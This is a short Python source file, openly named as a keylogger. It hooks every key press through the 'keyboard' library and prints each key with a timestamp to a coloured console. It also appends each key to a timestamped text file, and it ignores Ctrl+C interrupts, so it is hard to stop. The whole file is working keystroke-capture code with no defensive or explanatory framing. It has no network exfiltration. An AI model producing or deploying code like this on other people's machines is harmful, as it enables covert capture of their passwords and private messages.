import keyboard, time
from datetime import date
from colorama import Fore, Style

status_colors = {
    "+": Fore.GREEN,            # Success
    "-": Fore.RED,              # Failure
    "*": Fore.YELLOW,           # Warning
    ":": Fore.CYAN,             # Info
    " ": Fore.WHITE             # Normal
}

def display(status, data):
    print(f"{status_colors[status]}[{status}] {Fore.BLUE}[{date.today()} {time.strftime('%H:%M:%S', time.localtime())}] {status_colors[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}")

class keylogger:
    def __init__(self):
        self.file_name = str(date.today()) + "_" + time.strftime('%H_%M_%S', time.localtime()) + ".txt"
        keyboard.on_press(callback=self.write)
        while True:
            try:
                keyboard.wait()
            except KeyboardInterrupt:
                pass
    def write(self, event):
        log = f"[{date.today()}] [{time.strftime('%H:%M:%S', time.localtime())}] : {event.name}\n"
        display('+', log)
        with open(self.file_name, 'a') as file:
            file.write(log)

if __name__ == "__main__":
    listener = keylogger()